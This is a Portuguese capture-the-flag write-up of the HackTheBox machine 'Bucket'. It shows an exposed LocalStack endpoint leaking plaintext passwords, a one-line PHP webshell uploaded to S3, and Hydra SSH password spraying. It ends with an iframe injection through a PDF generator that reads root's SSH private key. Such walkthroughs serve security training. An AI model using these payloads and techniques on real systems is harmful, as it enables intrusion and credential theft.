---
layout: single
title: "Hackthebox write-up: Bucket"
namespace: "Hackthebox write-up: Bucket"
category: Writeup
tags: HackTheBox htb-medium htb-linux
date: 2021-04-24 12:00:00
header:
   teaser: https://i.imgur.com/m7oESPT.png
---

![Bucket](https://i.imgur.com/Qp79TCm.png)

## Enumeração

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.212                                                                  Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap -sC -sV -Pn -oA quick 10.10.10.212
Nmap scan report for 10.10.10.212
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds
```

Ao notar o redirect com erro para bucket.htb, adicionado entrada no arquivo `/etc/hosts` para o endereço ip da máquina

acessando o site, notado qeu houveram diversas imagens não carregadas, que apontavam para o dns **s3.bucket.htb**, o qual também foi adicionado na sequencia ao hosts também, vide execução curl onde validava todos os links na página

![image-20210226085915691](https://i.imgur.com/t2ajNzq.png)

```
$ curl -L http://bucket.htb | grep -Eo 'href=".*"|src=".*"' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0  33822      0 --:--:-- --:--:-- --:--:-- 33822
href="#"
href="#"><i class="fab fa-facebook-square"
href="#"><i class="fab fa-instagram"
href="#"><i class="fab fa-linkedin"
href="#"><i class="fab fa-twitter"
src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/cloud.png" alt="cheer" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/malware.png" alt="Malware" height="160" width="160"
```

Analisando **s3.bucket.htb** com `whatweb` notei que utiliza um outro webserver (hypercorn-h11) ou um proxy no meio do caminho.

executando gobuster para enumerar o s3 usando o `gobuster` encontrei os seguintes **diretórios**: *health* e *shell*

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/26 09:42:22 Starting gobuster
===============================================================
/health (Status: 200)
/shell (Status: 200)
Progress: 2643 / 220561 (1.20%)
```

é importante frisar que são diretórios pois as chamadas para cada um deles usando o `/` no final é diferente, conforme podemos ver abaixo: 

```bash
$ curl -L http://s3.bucket.htb/health                                                                       
{"services": {"s3": "running", "dynamodb": "running"}}

$ curl -L http://s3.bucket.htb/health/
{"status": "running"}                                                                                                 
$ curl -L http://s3.bucket.htb/shell


$ curl -L http://s3.bucket.htb/shell/
<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/Product">
  <head>
    <title>AWS Console</title>
    <meta charset="UTF-8">

    <!-- Application -->
[...]
```

como a última chamada retornou uma página, refiz a requisição via navegador, o que me retornou uma página do **DynamoDB Web Shell**. Pesquisando um pouco me parece que temos instalado nesta maquina um [Localstack](https://github.com/localstack/localstack), que emula um ambiente AWS on-premises para desenvolvimento.

![image-20210226094820303](https://i.imgur.com/6J27Miv.png)

Durante esta busca [encontrei tambem](https://reflectoring.io/aws-localstack/) que é possivel usar o awscli com o localstack, o que fiz conforme abaixo. Para as credenciais é importante colocar qualquer valor, pois não será validado porém a região deve ser uma válida, pra qual usaremos a **us-east-1**, obtido após usar alguns dos snippets do dynamoDB webshell onde pude listar uma tabela chamada **users** e sua descrição (ListTables e DescribeTable), onde pude obter seu resource name (`arn:aws:dynamodb:us-east-1:000000000000:table/users`)

Lendo a documentaçao do dynamoDB executei algumas ações simples como listar as tabelas e entradas existentes, conforme abaixo

```bash
# Install aws cli
$ sudo apt install awscli -y
[...]
$ aws configure --profile bucket.htb                                                                         
AWS Access Key ID [None]: dummy
AWS Secret Access Key [None]: dummy
Default region name [None]: us-east-1
Default output format [None]:

$ aws dynamodb list-tables \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb \
	--output json
{
  "TableNames": [
    "users"
  ]
}

$ aws dynamodb scan \
	--table-name users \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb \
	--output json
{
  "Items": [
    {
      "password": {
        "S": "Management@#1@#"
      },
      "username": {
        "S": "Mgmt"
      }
    },
    {
      "password": {
        "S": "Welcome123!"
      },
      "username": {
        "S": "Cloudadm"
      }
    },
    {
      "password": {
        "S": "n2vM-<_K_Q:.Aa2"
      },
      "username": {
        "S": "Sysadm"
      }
    }
  ],
  "Count": 3,
  "ScannedCount": 3,
  "ConsumedCapacity": null
}
```

![image-20210226100434225](https://i.imgur.com/cKIzAtd.png)

Como sabemos que temos um **s3** tambem em execução, enumerei algumas informações tambem sobre os containers existentes, no caso o **adserver** (o que já tinhamos uma ideia por conta da url das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.

```bash
$ aws s3 ls \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb
2021-02-26 11:48:02 adserver

$ aws s3 ls s3://adserver \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb
                           PRE images/
2021-02-26 11:50:04       5344 index.html

$ aws s3 ls s3://adserver/images/ \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb
2021-02-26 11:52:02      37840 bug.jpg
2021-02-26 11:52:02      51485 cloud.png
2021-02-26 11:52:02      16486 malware.png
```

## Acesso inicial

Uma vez que temos acesso ao blob s3 e sabemos quais os conteúdos e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:

```php
<?php system($_GET['cmd']); ?>
```

Apos a criaçaõ do arquvo, realizado o upload via CLI

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
	--endpoint-url http://s3.bucket.htb \
	--profile bucket.htb
upload: ./exploit.php to s3://adserver/exploit.php                
	
$ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/              
                           PRE images/
2021-02-26 11:56:28         31 exploit.php
2021-02-26 11:56:02       5344 index.html
```

Alguns instantes depois notei qeu o arquivo estava sendo removido por outro processo. para tentar contornar a questão, realizei a execução, na sequencia do comando `id` para comprovar a execução, o qeu retornou sucesso

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
	--endpoint-url http://s3.bucket.htb --profile bucket.htb && curl -L http://bucket.htb/exploit.php?cmd=id
upload: ./exploit.php to s3://adserver/exploit.php                
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para um shell reverso, alterei o arquivo `exploit.php` pelo php reverse shell do pentestmonkey e realizei a chamada abaixo, que retornou um shell reverso após algumas tentativas

```bash
aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ && curl -L http://bucket.htb/exploit.php
```

## User flag

### Enumeração

Executado `linpeas.sh` para agilizar enumeração, onde os seguintes itens interessantes foram identificados

- usuário `roy` possui console na máquina e, enumerando seu diretório há o arquivo `user.txt`, o qual não temos acesso leitura, e uma pasta `project` a ser inspecionada.

  - Este usuário não possui nenhum processo em execução que eventualmente permita a exploração

- as seguintes portas estão em listen na máquina, onde a 38443/TCP chama atenção

  ```
  [+] Active Ports                                                                                         
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
  Active Internet connections (servers and established)                                                     
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
  tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
  ```

- Esta máquina possui serviços de container em execução (ctr, runc), que executam provavelmente o localstack, e que poderao no futuro ser utilizados para escalar privilégios

- existe um diretório `/var/www/bucket-app` que pode ser a aplicação servida via porta 38443/TCP, mas que nao possuimos acesso de leitura

Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução na porta 38443, então iniciei por verificar as configurações ativas no apache (`/etc/apache2/sites-enabled`) e, no arquivo `000-default.conf`

```
<VirtualHost 127.0.0.1:8000>
	<IfModule mpm_itk_module>
		AssignUserId root root
	</IfModule>
	DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80>
	DocumentRoot /var/www/html
	RewriteEngine On
	RewriteCond %{HTTP_HOST} !^bucket.htb$
	RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
	ProxyPreserveHost on
	ProxyPass / http://localhost:4566/
	ProxyPassReverse / http://localhost:4566/
	<Proxy *>
		 Order deny,allow
		 Allow from all
	 </Proxy>
	ServerAdmin webmaster@localhost
	ServerName s3.bucket.htb

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

embora foi possível validar o site, precisamos conseguir um acesso com outra conta a fim de tunelar a comunicação com a maquina e acessar de nosso navegador o conteúdo deste website para explorá-lo.

Uma vez que não não consegui seguir muito a fundo com os websites, decidi testar as senhas que já temos para o usuário roy usando o `hydra`, onde obtivemos sucesso com 

```
$ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:36
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40
```

assim pudemos obter a flag de usuário

```
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ cat user.txt 
<redacted>
roy@bucket:~$
```

## Root flag

Uma vez que temos uma conexão SSH, fiz o redirecionamento da porta 8000 local para a 8000 da máquina, para que assim pudesse enumerar melhor o site que funciona nesta porta

```bash
$ ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000 
```

com isso pude acessar o conteúdo do website, listado abaixo:

![image-20210226130134357](https://i.imgur.com/tiTjm7I.png)

Embora esteja em construção notei que temos acesso ao diretório de onde a aplicação está sendo publicada, o que parece bastante com a estrutura da aplicação existente no diretório `project` do usuário **roy**. Para simplificar a validação copiei todo o diretório `/var/www/bucket-app` para a maquina local para simplificar a inspeção.

Analisando o conteúdo de `index.php` temos um conteúdo bem interessante, que é uma função escondida para que sempre que chamada a página 127.0.0.1:8000 com o parametro `action=get_alerts` é feita uma consulta numa tabela `alerts` no dynamoDB em que os valores com Title `Ransonware` são incluídos em um PDF e disponibilizados na pasta `/var/www/bucket-app/files/`.

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
	}
}
else
{
?>	
```

Uma vez que não temos uma tabela chamada `alerts`, conforme já enumerado, precisaremos criá-la com os parametros `title` e `data` e de alguma forma **roubar** alguma informação sensível na máquina. Para os testes iniciais, conforme documentação da AWS disponível [neste link](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html), criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na url em questão para gerar o arquivo PDF.

Antes de criar o script, criei uma chave rsa (`ssh-keygen`) e atribuí ao usuário **roy** para agilizar o processo de copia dos arquivos.



```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><p>Content</p></body></html>"}}' \
    --return-consumed-capacity TOTAL \
	--endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
```



![image-20210226154327078](https://i.imgur.com/XLxhZ9W.png)

A prova de conceito funcionou com sucesso, porém ainda preciso arrumar uma forma de importar algum arquivo do usuário root

```bash
roy@bucket:/var/www/bucket-app/files$ curl --data "action=get_alerts" http://localhost:8000/ && ls -la
total 16
drwxr-x---+ 2 root root 4096 Feb 26 18:51 .
drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
-rw-r--r--  1 root root   88 Feb 26 18:51 7627.html
-rw-r--r--  1 root root 1870 Feb 26 18:51 result.pdf
```

uma forma simples seria importar o arquivo /root/root.txt, porém isso não nos dá um shell reverso. Seguindo o exemplo da máquina **Passage**, vamos buscar por um arquivo `/root/.ssh/id_rsa` para tentarmos nos conectar via SSH, porém precisamos de uma forma de injeção em arquivos html estáticos. A única maneira que encontrei, sem a necessidade de escrever um javascript para esta tarefa, foi utiliando um **iframe**, onde utilizei as seguintes chamadas em ordem:

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><iframe src=\"/root/.ssh/id_rsa\" seamless></iframe></body></html>"}}' \
    --return-consumed-capacity TOTAL \
	--endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
```

```
root@bucket:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bucket:~# cat /root/root.txt
<redacted>
root@bucket:~#
```

